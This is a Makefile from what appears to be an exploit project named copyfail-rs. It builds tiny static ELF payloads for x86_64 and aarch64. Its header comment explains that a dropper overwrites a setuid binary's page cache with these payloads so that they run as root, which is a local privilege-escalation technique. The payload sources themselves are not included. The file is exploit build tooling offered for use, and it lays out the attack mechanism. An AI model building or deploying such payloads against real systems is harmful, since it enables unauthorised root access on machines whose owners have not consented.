# copyfail-rs payloads
#
# Each payload is a tiny static ELF. The dropper overwrites the head of
# the target binary's page cache with these bytes; execve() reads the
# cached pages and runs them. Setuid bit on the on-disk inode grants
# euid=0 to the cached image.
#
# Linker flags:
#   -static -nostdlib -no-pie       no glibc, position-dependent
#   -Wl,-N                          merge text+data into one PT_LOAD,
#                                   trims ~10 KB of alignment padding
#   -Wl,-z,max-page-size=0x10       16-byte on-disk alignment
#                                   (kernel still uses 4 KB pages at runtime)

CC_X86_64 ?= gcc
CC_AARCH64 ?= aarch64-linux-gnu-gcc

LDFLAGS_COMMON ?= -static -nostdlib -no-pie -Os -s -ffreestanding \
                  -fno-asynchronous-unwind-tables -fno-ident \
                  -fno-stack-protector \
                  -Wl,-N -Wl,-z,max-page-size=0x10 \
                  -Wl,--build-id=none

.PHONY: all clean info x86_64 aarch64

all: x86_64.bin

x86_64: x86_64.bin
aarch64: aarch64.bin

x86_64.bin: payload-x86_64.S
	$(CC_X86_64) $(LDFLAGS_COMMON) -o $@ $<
	@SZ=$$(stat -c '%s' $@); \
	  if [ $$((SZ % 4)) -ne 0 ]; then \
	    echo "ERROR: $@ is $$SZ bytes (not 4-byte aligned)"; rm -f $@; exit 1; fi

aarch64.bin: payload-aarch64.S
	$(CC_AARCH64) $(LDFLAGS_COMMON) -o $@ $<
	@SZ=$$(stat -c '%s' $@); \
	  if [ $$((SZ % 4)) -ne 0 ]; then \
	    echo "ERROR: $@ is $$SZ bytes (not 4-byte aligned)"; rm -f $@; exit 1; fi

info: all
	@for f in *.bin; do \
		test -f $$f || continue; \
		printf '%-16s %5d bytes\n' $$f $$(stat -c '%s' $$f); \
	done

clean:
	rm -f *.bin
